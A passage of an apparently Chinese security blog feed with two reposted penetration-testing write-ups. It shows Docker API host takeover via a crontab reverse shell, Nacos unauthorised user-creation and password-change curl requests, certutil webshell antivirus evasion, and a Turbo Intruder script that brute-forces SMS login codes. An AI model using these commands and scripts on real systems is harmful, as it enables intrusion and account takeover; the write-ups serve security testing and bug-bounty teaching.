<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="c1">#查看容器 docker -H tcp://&lt;target&gt;:2375 ps -a
</span></span></span></code></pre></td></tr></table>
</div>
</div><p><a class="lightgallery" href="https://shs3.b.qianxin.com/attack_forum/2023/09/attach-51cfb8bea7521008030a205378af8c6c852f3660.png" title="image.png" data-thumbnail="https://shs3.b.qianxin.com/attack_forum/2023/09/attach-51cfb8bea7521008030a205378af8c6c852f3660.png">
        
    </a></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="c1">#挂载宿主机的根目录到容器内的mnt目录 docker -H tcp://&lt;target&gt;:2375 run -it -v /:/mnt nginx:latest /bin/bash #反弹shell echo &#39;反弹shell命令&#39; &gt;&gt; /mnt/var/spool/cron/crontabs/root
</span></span></span></code></pre></td></tr></table>
</div>
</div><h2 id="24nacos" class="headerLink">
    <a href="#24nacos" class="header-mark"></a>2.4、Nacos</h2><p>Nacos是一个开源的动态服务发现、配置管理和服务管理平台，它提供了注册中心、配置中心和服务管理等功能，帮助开发人员实现微服务架构中的服务注册、配置管理以及服务发现等需求。</p>
<p>作为一个开源工具，漏洞还是被披露不少的，</p>
<p><strong>未授权访问：</strong><a href="http://192.168.80.131:8848/nacos/v1/auth/users?pageNo=1&amp;pageSize=1" target="_blank" rel="noopener noreferrer">/nacos/v1/auth/users?pageNo=1&amp;pageSize=1</a> 直接查看用户</p>
<p><strong>任意用户添加</strong>：POST <a href="http://192.168.80.131:8848/nacos/v1/auth/users?pageNo=1&amp;pageSize=1" target="_blank" rel="noopener noreferrer">/nacos/v1/auth/users</a> username= &amp; password=</p>
<p><strong>任意用户密码修改</strong>：curl -X PUT &lsquo;<a href="http://127.0.0.1:8848/nacos/v1/auth/users?accessToken" target="_blank" rel="noopener noreferrer">http://127.0.0.1:8848/nacos/v1/auth/users?accessToken</a>\=&rsquo; -H &lsquo;User-Agent:Nacos-Server&rsquo; -d &lsquo;username\=test1&amp;newPassword\=test2&rsquo;</p>
<p><strong>弱口令</strong>：nacos/nacos</p>
<p><a class="lightgallery" href="https://shs3.b.qianxin.com/attack_forum/2023/09/attach-bc51f0813b8aa1b7f7072167c68ba15a26d10279.png" title="image.png" data-thumbnail="https://shs3.b.qianxin.com/attack_forum/2023/09/attach-bc51f0813b8aa1b7f7072167c68ba15a26d10279.png">
        
    </a></p>
<p>通过编排密码爆破进后台，发现大量配置文件，但敏感信息均被加密</p>
<p><a class="lightgallery" href="https://shs3.b.qianxin.com/attack_forum/2023/09/attach-62d51f1c7326e7114b1022865a3669ed6d4f46b7.png" title="image.png" data-thumbnail="https://shs3.b.qianxin.com/attack_forum/2023/09/attach-62d51f1c7326e7114b1022865a3669ed6d4f46b7.png">
        
    </a></p>
<h3 id="241jasypt加密" class="headerLink">
    <a href="#241jasypt%e5%8a%a0%e5%af%86" class="header-mark"></a>2.4.1、Jasypt加密</h3><p>Spring 的配置文件中会有一些敏感信息，如数据库密码，因此有时我们希望将敏感信息加密，Jasypt 就是其中比较方便的工具，Jasypt 是一个 Java 库，用于简化敏感数据（如密码、API 密钥等）的加密和解密操作。</p>
<p>加密的内容需要用 ENC(..) 括起来，加密用的密码通过 jasypt.encryptor.password 指定。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">spring</span><span class="o">:</span> <span class="nx">datasource</span><span class="o">:</span> <span class="nx">username</span><span class="o">:</span> <span class="nx">your</span><span class="o">-</span><span class="nx">username</span> <span class="nx">password</span><span class="o">:</span> <span class="nx">ENC</span><span class="p">(</span><span class="nx">encrypted</span><span class="o">-</span><span class="nx">password</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>因为必须要解密，密码就需要放在配置文件里，或者放在代码中：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="c1"># application.yml jasypt: encryption: password: 密码 algorithm: 加密方式
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>解密数据：使用解密器的 decrypt 方法对加密的数据进行解密操作。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">import</span> <span class="nx">org</span><span class="o">.</span><span class="nx">jasypt</span><span class="o">.</span><span class="nx">util</span><span class="o">.</span><span class="nx">text</span><span class="o">.</span><span class="nx">BasicTextEncryptor</span><span class="p">;</span> <span class="k">public</span> <span class="k">class</span> <span class="nc">DecryptionExample</span> <span class="p">{</span> <span class="k">public</span> <span class="k">static</span> <span class="nx">void</span> <span class="nx">main</span><span class="p">(</span><span class="nx">String</span><span class="p">[]</span> <span class="nx">args</span><span class="p">)</span> <span class="p">{</span> <span class="nx">String</span> <span class="nx">encryptionKey</span> <span class="o">=</span> <span class="s2">&#34;yourEncryptionKey&#34;</span><span class="p">;</span> <span class="c1">// 加密密钥 BasicTextEncryptor textEncryptor = new BasicTextEncryptor(); textEncryptor.setPassword(encryptionKey); String encryptedText = &#34;encryptedText&#34;; // 加密后的数据 String decryptedText = textEncryptor.decrypt(encryptedText); System.out.println(&#34;Decrypted Text: &#34; + decryptedText); } }
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>但是客户端加密的安全性主要依赖于客户端代码的保护和可信任性，当密码泄露后，加密也就自然失效了，在ncaos一个文件中发现jasypt加密密码，可以直接进行解密操作</p>
<p><a class="lightgallery" href="https://shs3.b.qianxin.com/attack_forum/2023/09/attach-9faa6a1da39d5898cb65917064c9885c218ded42.png" title="image.png" data-thumbnail="https://shs3.b.qianxin.com/attack_forum/2023/09/attach-9faa6a1da39d5898cb65917064c9885c218ded42.png">
        
    </a><br>
成功连接OSS</p>
<p><a class="lightgallery" href="https://shs3.b.qianxin.com/attack_forum/2023/09/attach-572d2495c72d7b1a2b65dce002b6f11edb94260b.png" title="image.png" data-thumbnail="https://shs3.b.qianxin.com/attack_forum/2023/09/attach-572d2495c72d7b1a2b65dce002b6f11edb94260b.png">
        
    </a></p>
<p>成功连接数据库</p>
<p><a class="lightgallery" href="https://shs3.b.qianxin.com/attack_forum/2023/09/attach-a758622d45da44e07aa10ed7765337f625f449c5.png" title="image.png" data-thumbnail="https://shs3.b.qianxin.com/attack_forum/2023/09/attach-a758622d45da44e07aa10ed7765337f625f449c5.png">
        
    </a></p>
<p>小程序token，接管小程序</p>
<p><a class="lightgallery" href="https://shs3.b.qianxin.com/attack_forum/2023/09/attach-d07c1eb2ba1682ffe1f4a4733a0f5edf186b18de.png" title="image.png" data-thumbnail="https://shs3.b.qianxin.com/attack_forum/2023/09/attach-d07c1eb2ba1682ffe1f4a4733a0f5edf186b18de.png">
        
    </a></p>
<p>达梦数据库是国产化的关系型数据库，使用下面工具可以进行连接</p>
<p><a href="https://github.com/864381832/x-RdbmsSyncTool/releases/tag/v0.0.3" target="_blank" rel="noopener noreferrer">https://github.com/864381832/x-RdbmsSyncTool/releases/tag/v0.0.3</a></p>
<h2 id="3nday" class="headerLink">
    <a href="#3nday" class="header-mark"></a>3、Nday</h2><h2 id="31yongyounc-jsinvoke-rce漏洞" class="headerLink">
    <a href="#31yongyounc-jsinvoke-rce%e6%bc%8f%e6%b4%9e" class="header-mark"></a>3.1、yongyouNC jsInvoke rce漏洞</h2><p>漏洞利用方法，通过Java反射机制创建一个javax.naming.InitialContext对象，并使用LDAP协议连接到指定的IP地址和端口，然后调用&quot;nc.itf.iufo.IBaseSPService&quot;服务中的&quot;saveXStreamConfig&quot;方法，接受对象和字符串作为参数，达到命令执行的效果。</p>
<p>命令执行成功，但是目标系统存在杀软，无法直接上传文件</p>
<p><a class="lightgallery" href="https://shs3.b.qianxin.com/attack_forum/2023/09/attach-7965cfa7808da6e0981fbf7b46a710bce3dcf9db.png" title="image.png" data-thumbnail="https://shs3.b.qianxin.com/attack_forum/2023/09/attach-7965cfa7808da6e0981fbf7b46a710bce3dcf9db.png">
        
    </a></p>
<h3 id="311certutil" class="headerLink">
    <a href="#311certutil" class="header-mark"></a>3.1.1、certutil</h3><p>certutil 是 Windows 操作系统中的一个命令行工具，主要用于处理证书和加密相关的操作，利用 certutil的解密操作可以绕过杀软。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">echo</span> <span class="nx">bash64编码后的免杀马</span> <span class="o">&gt;</span> <span class="nx">myfile</span><span class="o">.</span><span class="nx">jsp</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><a class="lightgallery" href="https://shs3.b.qianxin.com/attack_forum/2023/09/attach-ca978a10493d65b989cf352bbbd125c2f77d8d4b.png" title="image.png" data-thumbnail="https://shs3.b.qianxin.com/attack_forum/2023/09/attach-ca978a10493d65b989cf352bbbd125c2f77d8d4b.png">
        
    </a></p>
<p>使用certutil进行解码</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">certutil</span> <span class="o">-</span><span class="nx">decode</span> <span class="nx">木马相对路径</span> <span class="nx">解码后的木马相对路径</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><a class="lightgallery" href="https://shs3.b.qianxin.com/attack_forum/2023/09/attach-0069dbaf0c23e4ea2e284cccc370d0508c1f35a0.png" title="image.png" data-thumbnail="https://shs3.b.qianxin.com/attack_forum/2023/09/attach-0069dbaf0c23e4ea2e284cccc370d0508c1f35a0.png">
        
    </a></p>
<p>冰蝎上线并上线CS</p>
<p><a class="lightgallery" href="https://shs3.b.qianxin.com/attack_forum/2023/09/attach-1c88c33f8c747709119140b588136098628a120c.png" title="image.png" data-thumbnail="https://shs3.b.qianxin.com/attack_forum/2023/09/attach-1c88c33f8c747709119140b588136098628a120c.png">
        
    </a></p>
<h2 id="32若依二开" class="headerLink">
    <a href="#32%e8%8b%a5%e4%be%9d%e4%ba%8c%e5%bc%80" class="header-mark"></a>3.2、若依二开</h2><p>shiro的洞修复了，找到一个前台信息泄露漏洞</p>
<p><a class="lightgallery" href="https://shs3.b.qianxin.com/attack_forum/2023/09/attach-cd3041c5be5bda7370ccbdaa6c958df8b775591b.png" title="image.png" data-thumbnail="https://shs3.b.qianxin.com/attack_forum/2023/09/attach-cd3041c5be5bda7370ccbdaa6c958df8b775591b.png">
        
    </a></p>
<p>通过获取到的用户名，使用弱口令进入后台，普通权限</p>
<p><a class="lightgallery" href="https://shs3.b.qianxin.com/attack_forum/2023/09/attach-85e0760d8a43c53ef6903fe8d54e6f8d2ff19d63.png" title="image.png" data-thumbnail="https://shs3.b.qianxin.com/attack_forum/2023/09/attach-85e0760d8a43c53ef6903fe8d54e6f8d2ff19d63.png">
        
    </a></p>
<p>再次对公告发布人员猜解密码，成功登录后台，多了系统管理权限，直接添加用户赋予最高权限</p>
<p><a class="lightgallery" href="https://shs3.b.qianxin.com/attack_forum/2023/09/attach-cc108479b419389d1d681b8639c528727d8286a6.png" title="image.png" data-thumbnail="https://shs3.b.qianxin.com/attack_forum/2023/09/attach-cc108479b419389d1d681b8639c528727d8286a6.png">
        
    </a></p>
<p>新增用户登录，发现定时任务功能，直接使用定时任务执行命令</p>
<p><a class="lightgallery" href="https://shs3.b.qianxin.com/attack_forum/2023/09/attach-ac0b3d70b98d7dd50bfe09bcff238f0ed23089df.png" title="image.png" data-thumbnail="https://shs3.b.qianxin.com/attack_forum/2023/09/attach-ac0b3d70b98d7dd50bfe09bcff238f0ed23089df.png">
        
    </a></p>
<h2 id="33shiro" class="headerLink">
    <a href="#33shiro" class="header-mark"></a>3.3、shiro</h2><p>目标路径在被访问时，会先跳转到统一认证登录，导致大部分都忽视了该路径是存在shiro反序列化漏洞的</p>
<p><a class="lightgallery" href="https://shs3.b.qianxin.com/attack_forum/2023/09/attach-f81143a6217ca648a5848eb99aea082c598fb2f5.png" title="image.png" data-thumbnail="https://shs3.b.qianxin.com/attack_forum/2023/09/attach-f81143a6217ca648a5848eb99aea082c598fb2f5.png">
        
    </a></p>
<p>本着试一试的心态进行了shiro的扫描，默认密钥，直接获取权限</p>
<p><a class="lightgallery" href="https://shs3.b.qianxin.com/attack_forum/2023/09/attach-acd9d83416103fc5d4c208d3b705b28c5a15c09a.png" title="image.png" data-thumbnail="https://shs3.b.qianxin.com/attack_forum/2023/09/attach-acd9d83416103fc5d4c208d3b705b28c5a15c09a.png">
        
    </a></p>]]></description>
</item><item>
    <title>任意用户登录漏洞挖掘思路</title>
    <link>https://www.bysec.cn/%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF/</link>
    <pubDate>Sat, 20 Jan 2024 18:17:14 &#43;0800</pubDate><author>
        <name>bysec</name>
    </author><guid>https://www.bysec.cn/%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF/</guid>
    <description><![CDATA[<blockquote>
<p><em>转载自： <a href="https://forum.butian.net/share/2553" target="_blank" rel="noopener noreferrer">https://forum.butian.net/share/2553</a></em></p>
</blockquote>
<h2 id="任意用户登录漏洞挖掘思路" class="headerLink">
    <a href="#%e4%bb%bb%e6%84%8f%e7%94%a8%e6%88%b7%e7%99%bb%e5%bd%95%e6%bc%8f%e6%b4%9e%e6%8c%96%e6%8e%98%e6%80%9d%e8%b7%af" class="header-mark"></a>任意用户登录漏洞挖掘思路</h2><h2 id="前言" class="headerLink">
    <a href="#%e5%89%8d%e8%a8%80" class="header-mark"></a>前言</h2><p>任意用户登录漏洞以利用漏洞利用难度低、危害高、奖金高已经成为src/众测漏洞挖掘中的香饽饽，本文将分享一下众测/src中任意用户登录漏洞的挖掘思路。</p>
<h2 id="1手机验证码问题导致的任意用户登录" class="headerLink">
    <a href="#1%e6%89%8b%e6%9c%ba%e9%aa%8c%e8%af%81%e7%a0%81%e9%97%ae%e9%a2%98%e5%af%bc%e8%87%b4%e7%9a%84%e4%bb%bb%e6%84%8f%e7%94%a8%e6%88%b7%e7%99%bb%e5%bd%95" class="header-mark"></a>1.手机验证码问题导致的任意用户登录</h2><h3 id="11-验证码爆破" class="headerLink">
    <a href="#11-%e9%aa%8c%e8%af%81%e7%a0%81%e7%88%86%e7%a0%b4" class="header-mark"></a>1.1 验证码爆破</h3><p>当登录流程使用手机验证码登录，没有图片验证码/图片验证码可重用/图片验证码简单可识别（可以使用captcha-killer-modified插件）且后端没有限制手机验证码验证错误次数时，可以尝试爆破手机验证码登录其他用户。</p>
<p>4位验证码的爆破老生常谈不再赘述；随着厂商们服务器性能的提高，服务器的rps的上升也使得6位验证码的爆破越来越快，可以使用如下方法爆破（！！！需留意服务器的rps以及测试厂商的注意事项，rps低的老系统或者厂商禁止批量爆破的项目谨慎使用6位验证码的爆破！！！）：</p>
<p>使用burpsuite的Turbo Intruder插件，编写如下脚本：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">import</span> <span class="nx">re</span> <span class="nx">def</span> <span class="nx">queueRequests</span><span class="p">(</span><span class="nx">target</span><span class="p">,</span> <span class="nx">wordlists</span><span class="p">)</span><span class="o">:</span> <span class="nx">engine</span> <span class="o">=</span> <span class="nx">RequestEngine</span><span class="p">(</span><span class="nx">endpoint</span><span class="o">=</span><span class="nx">target</span><span class="o">.</span><span class="nx">endpoint</span><span class="p">,</span> <span class="nx">concurrentConnections</span><span class="o">=</span><span class="mi">30</span><span class="p">,</span> <span class="nx">requestsPerConnection</span><span class="o">=</span><span class="mi">30</span><span class="p">,</span> <span class="nx">pipeline</span><span class="o">=</span><span class="k">True</span> <span class="p">)</span> <span class="k">for</span> <span class="nx">i</span> <span class="nx">in</span> <span class="nx">range</span><span class="p">(</span><span class="mi">1000000</span><span class="p">)</span><span class="o">:</span> <span class="c1">#生成六位验证码字典 number = &#34;{:06d}&#34;.format(i) engine.queue(target.req, number.rstrip()) def handleResponse(req, interesting): # currently available attributes are req.status, req.wordcount, req.length and req.response if req.status &lt;404: &#39;&#39;&#39;res = re.findall(&#39;Msg&#34;:&#34;(.*?)&#34;&#39;,req.response)[0] if len(res)&gt;18:&#39;&#39;&#39; #六位数的验证码爆破结果展示列太多，可根据实际情况自行筛选展示 table.add(req)
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>成功案例如下：</p>
<p><a class="lightgallery" href="https://shs3.b.qianxin.com/butian_public/f569252ea38f1a70e1f19836eea8bf50341ab80a2127e.jpg" title="image-20231026152744211" data-thumbnail="https://shs3.b.qianxin.com/butian_public/f569252ea38f1a70e1f19836eea8bf50341ab80a2127e.jpg">
        
    </a></p>
<h3 id="12-验证码明文返回" class="headerLink">
    <a href="#12-%e9%aa%8c%e8%af%81%e7%a0%81%e6%98%8e%e6%96%87%e8%bf%94%e5%9b%9e" class="header-mark"></a>1.2 验证码明文返回</h3><p>获取手机验证码时，验证码直接在返回包里</p>
<p><a class="lightgallery" href="https://shs3.b.qianxin.com/butian_public/f29427169da964cc10157fa9ec98efa75a51f93ff59f0.jpg" title="image-20231026153621371" data-thumbnail="https://shs3.b.qianxin.com/butian_public/f29427169da964cc10157fa9ec98efa75a51f93ff59f0.jpg">
        
    </a></p>
<h3 id="13-存在万能验证码" class="headerLink">
    <a href="#13-%e5%ad%98%e5%9c%a8%e4%b8%87%e8%83%bd%e9%aa%8c%e8%af%81%e7%a0%81" class="header-mark"></a>1.3 存在万能验证码</h3><p>一般是测试为了功能测试方便，设置了诸如000000，123456（六位验证码爆破能发现）之类的万能验证码，项目上线时忘记下掉，导致任意用户登录</p>
<h3 id="14-验证码未绑定用户" class="headerLink">
    <a href="#14-%e9%aa%8c%e8%af%81%e7%a0%81%e6%9c%aa%e7%bb%91%e5%ae%9a%e7%94%a8%e6%88%b7" class="header-mark"></a>1.4 验证码未绑定用户</h3><p>a.后端仅验证了验证码是否正确，没有验证验证码与获取手机号的对应关系，导致可以先输入自己的手机号A获取验证码，再输入他人手机号B获取验证码后，填写自己手机号A接收到的验证码，达到登录手机号B的目的</p>
<p>b.后端仅验证码了手机号与验证码是否一致，并未校验手机号是否为号主本人的,导致可以使用自己的手机号+验证码绕过。常见于用户绑定的功能处。举个栗子：</p>
<p>某系统输入商户号与手机号可绑定到该用户</p>
<p><a class="lightgallery" href="https://shs3.b.qianxin.com/butian_public/f6452944ddfaec6db93aa224f926873e2692cfaa51ddc.jpg" title="image-20231026155939201" data-thumbnail="https://shs3.b.qianxin.com/butian_public/f6452944ddfaec6db93aa224f926873e2692cfaa51ddc.jpg">
        
    </a></p>
<p>通过用户注册的功能处，输入自己的手机号获取验证码</p>
<p><a class="lightgallery" href="https://shs3.b.qianxin.com/butian_public/f1467599b8a33c200cbdfc0cd5c248398f5a05fc7756e.jpg" title="image-20231026160036332" data-thumbnail="https://shs3.b.qianxin.com/butian_public/f1467599b8a33c200cbdfc0cd5c248398f5a05fc7756e.jpg">
        
    </a></p>
<p>返回绑定功能处，输入任意验证码抓包，将手机号与验证码字段改为自己的手机号+验证码</p>
<p><a class="lightgallery" href="https://shs3.b.qianxin.com/butian_public/f8121562fa557770f53d99e14151945ea13a41f59f673.jpg" title="image-20231026160250988" data-thumbnail="https://shs3.b.qianxin.com/butian_public/f8121562fa557770f53d99e14151945ea13a41f59f673.jpg">
        
    </a></p>
<p>成功登录他人账号</p>
<p><a class="lightgallery" href="https://shs3.b.qianxin.com/butian_public/f71223424542bfb8b033dd4a6de695a0454da99fe0dda.jpg" title="image-20231026160327497" data-thumbnail="https://shs3.b.qianxin.com/butian_public/f71223424542bfb8b033dd4a6de695a0454da99fe0dda.jpg">
        
    </a></p>
<h3 id="15-获取验证码的手机号字段可双写" class="headerLink">
    <a href="#15-%e8%8e%b7%e5%8f%96%e9%aa%8c%e8%af%81%e7%a0%81%e7%9a%84%e6%89%8b%e6%9c%ba%e5%8f%b7%e5%ad%97%e6%ae%b5%e5%8f%af%e5%8f%8c%e5%86%99" class="header-mark"></a>1.5 获取验证码的手机号字段可双写</h3><p>输入手机号获取验证码时抓包，双写手机号字段，使得两个手机号获取到同一个验证码，便可以登录其他用户</p>
<p><a class="lightgallery" href="https://shs3.b.qianxin.com/butian_public/f957197d0bac9fd9865630e16883ec371423407a0c1ee.jpg" title="image-20231026160708565" data-thumbnail="https://shs3.b.qianxin.com/butian_public/f957197d0bac9fd9865630e16883ec371423407a0c1ee.jpg">
        
    </a></p>
<p>输入自己的手机号抓包，将手机字段后面加一个逗号或者分号后再加一个手机号，或者双写手机号字段phone=13333333333&amp;phone=18888888888，当两个手机号均收到一个验证码时大概率漏洞存在。使用自己的手机号便可以任意登录其他手机号</p>
<p><a class="lightgallery" href="https://shs3.b.qianxin.com/butian_public/f1298410bdcead04991a6070a151953c584540f0068d1.jpg" title="image-20231026161544754" data-thumbnail="https://shs3.b.qianxin.com/butian_public/f1298410bdcead04991a6070a151953c584540f0068d1.jpg">
        
    </a></p>
<h3 id="16-验证码为空任意验证码可成功验证" class="headerLink">
    <a href="#16-%e9%aa%8c%e8%af%81%e7%a0%81%e4%b8%ba%e7%a9%ba%e4%bb%bb%e6%84%8f%e9%aa%8c%e8%af%81%e7%a0%81%e5%8f%af%e6%88%90%e5%8a%9f%e9%aa%8c%e8%af%81" class="header-mark"></a>1.6 验证码为空/任意验证码可成功验证</h3><p>比较奇葩的例子，验证码为空时，手机号正确则成功登录（账号密码登录体系也发现过这种情况，空密码的情况下账号存在即登录）</p>
<h2 id="2凭证安全问题导致的任意用户登录" class="headerLink">
    <a href="#2%e5%87%ad%e8%af%81%e5%ae%89%e5%85%a8%e9%97%ae%e9%a2%98%e5%af%bc%e8%87%b4%e7%9a%84%e4%bb%bb%e6%84%8f%e7%94%a8%e6%88%b7%e7%99%bb%e5%bd%95" class="header-mark"></a>2.凭证安全问题导致的任意用户登录</h2><h3 id="21-凭证泄露" class="headerLink">
    <a href="#21-%e5%87%ad%e8%af%81%e6%b3%84%e9%9c%b2" class="header-mark"></a>2.1 凭证泄露</h3><h4 id="211-页面缓存被搜索引擎抓取" class="headerLink">
    <a href="#211-%e9%a1%b5%e9%9d%a2%e7%bc%93%e5%ad%98%e8%a2%ab%e6%90%9c%e7%b4%a2%e5%bc%95%e6%93%8e%e6%8a%93%e5%8f%96" class="header-mark"></a>2.1.1 页面缓存被搜索引擎抓取</h4><p>搜索引擎搜索该域名，发现有登录后的页面被抓取，直接访问登录目标账户</p>
<p><a class="lightgallery" href="https://shs3.b.qianxin.com/butian_public/f4091122410659bb3807c58c04a8a0e16998417e9b325.jpg" title="image-20231026111018248" data-thumbnail="https://shs3.b.qianxin.com/butian_public/f4091122410659bb3807c58c04a8a0e16998417e9b325.jpg">
        
    </a></p>
<p><a class="lightgallery" href="https://shs3.b.qianxin.com/butian_public/f9782237ebec4441168fe52169f957b9e5370a0a1b18c.jpg" title="image-20231026111129791" data-thumbnail="https://shs3.b.qianxin.com/butian_public/f9782237ebec4441168fe52169f957b9e5370a0a1b18c.jpg">
        
    </a></p>
<h4 id="212-httptracedruid等组件中的凭证泄露" class="headerLink">
    <a href="#212-httptracedruid%e7%ad%89%e7%bb%84%e4%bb%b6%e4%b8%ad%e7%9a%84%e5%87%ad%e8%af%81%e6%b3%84%e9%9c%b2" class="header-mark"></a>2.1.2 httptrace/druid等组件中的凭证泄露</h4><h5 id="httptrace" class="headerLink">
    <a href="#httptrace" class="header-mark"></a>httptrace</h5><p>spring的httptrace端点往往会记录用户的会话信息，若发现spring未授权访问且存在类似端点可以访问的话，可尝试获取用户凭证进行登录</p>
<p><a class="lightgallery" href="https://shs3.b.qianxin.com/butian_public/f3018070bc7fb934f1e5f06cf5d0ad0f6b08542225789.jpg" title="image-20231026163705868" data-thumbnail="https://shs3.b.qianxin.com/butian_public/f3018070bc7fb934f1e5f06cf5d0ad0f6b08542225789.jpg">
        
    </a></p>
<h5 id="durid" class="headerLink">
    <a href="#durid" class="header-mark"></a>durid</h5><p>druid的session监控若发现有效的会话信息时，可以通过此登录任意用户，将druid的未授权中危漏洞提升至高危</p>
<p><a class="lightgallery" href="https://shs3.b.qianxin.com/butian_public/f449949895ad92d513e2154772ee8676047ce70a1f4a0.jpg" title="image-20231026113057179" data-thumbnail="https://shs3.b.qianxin.com/butian_public/f449949895ad92d513e2154772ee8676047ce70a1f4a0.jpg">
        
    </a></p>
<p><a class="lightgallery" href="https://shs3.b.qianxin.com/butian_public/f269203959c6bc73dbd71560c963f123e4727b378ffc1.jpg" title="image-20231026113234298" data-thumbnail="https://shs3.b.qianxin.com/butian_public/f269203959c6bc73dbd71560c963f123e4727b378ffc1.jpg">
        
    </a></p>
<h4 id="212-sessionkey泄露" class="headerLink">
    <a href="#212-sessionkey%e6%b3%84%e9%9c%b2" class="header-mark"></a>2.1.2 sessionkey泄露</h4><p>微信小程序官方提供了一套微信快捷登录的登录逻辑，用户授权手机号快捷登录时，会将本地的手机号使用sessionkey和iv进行aes加密，后端解密后返回该手机号的登录凭证。当sessionkey发生泄露时，攻击者便可以伪造手机号登录任意手机号</p>
<p><a class="lightgallery" href="https://shs3.b.qianxin.com/butian_public/f435754b0adfe30b25f1261d93d1ac2d276c4ef2c224b.jpg" title="image-20231026164613313" data-thumbnail="https://shs3.b.qianxin.com/butian_public/f435754b0adfe30b25f1261d93d1ac2d276c4ef2c224b.jpg">
        
    </a></p>
<p>修改任意手机号，利用sessionkey和iv重新加密数据</p>
<p><a class="lightgallery" href="https://shs3.b.qianxin.com/butian_public/f282873664a2d4f77cf7f0fb934e1272844ac9234329e.jpg" title="image-20231026164903153" data-thumbnail="https://shs3.b.qianxin.com/butian_public/f282873664a2d4f77cf7f0fb934e1272844ac9234329e.jpg">
        
    </a></p>
<p>成功登录他人账号</p>
<p><a class="lightgallery" href="https://shs3.b.qianxin.com/butian_public/f21869586dca7202d7ad49fdf2fd62983bb26c7a25afd.jpg" title="image-20231026165003227" data-thumbnail="https://shs3.b.qianxin.com/butian_public/f21869586dca7202d7ad49fdf2fd62983bb26c7a25afd.jpg">
        
    </a></p>
<h4 id="213-其他接口中的信息泄露" class="headerLink">
    <a href="#213-%e5%85%b6%e4%bb%96%e6%8e%a5%e5%8f%a3%e4%b8%ad%e7%9a%84%e4%bf%a1%e6%81%af%e6%b3%84%e9%9c%b2" class="header-mark"></a>2.1.3 其他接口中的信息泄露</h4><p>这个一般发现于js或者api-docs中的某些特殊接口，例如getToken之类的，有没有取决于开发有没有开发类似的功能接口</p>
<p><a class="lightgallery" href="https://shs3.b.qianxin.com/butian_public/f94347450d57e69d7429bfd2cb5c5565c2b4f3d75c3e6.jpg" title="image-20231026165405684" data-thumbnail="https://shs3.b.qianxin.com/butian_public/f94347450d57e69d7429bfd2cb5c5565c2b4f3d75c3e6.jpg">
        
    </a></p>
<h3 id="22-凭证可伪造" class="headerLink">
    <a href="#22-%e5%87%ad%e8%af%81%e5%8f%af%e4%bc%aa%e9%80%a0" class="header-mark"></a>2.2 凭证可伪造</h3><h4 id="221-jwt未验参弱密钥" class="headerLink">
    <a href="#221-jwt%e6%9c%aa%e9%aa%8c%e5%8f%82%e5%bc%b1%e5%af%86%e9%92%a5" class="header-mark"></a>2.2.1 jwt未验参/弱密钥</h4><p>系统使用jwt作为认证字段，且其中关键用户信息字段可以遍历时，若未验参或者使用弱密钥时，便可以将用户信息字段进行更改，删除/爆破弱密钥重新生成签名，到达任意用户登录</p>
<h5 id="jwt未验参" class="headerLink">
    <a href="#jwt%e6%9c%aa%e9%aa%8c%e5%8f%82" class="header-mark"></a>jwt未验参</h5><p>删除签名部分(或者更改头部中的alg为none再删除签名)，访问登录后的接口成功访问，说明jwt未验参()</p>
<p><a class="lightgallery" href="https://shs3.b.qianxin.com/butian_public/f3944195587a7f73d26e1987f25578d5a76f94a3b3207.jpg" title="image-20231026170046925" data-thumbnail="https://shs3.b.qianxin.com/butian_public/f3944195587a7f73d26e1987f25578d5a76f94a3b3207.jpg">
        
    </a></p>
<p>遍历data字段即可登录其他用户（此处的data为用户id）</p>
<h5 id="jwt弱密钥" class="headerLink">
    <a href="#jwt%e5%bc%b1%e5%af%86%e9%92%a5" class="header-mark"></a>jwt弱密钥</h5><p>jwt使用了弱密钥时，爆破到弱密钥后同样修改jwt中的用户信息字段，使用密钥重新生成签名即可获取到其他用户的jwt字段</p>
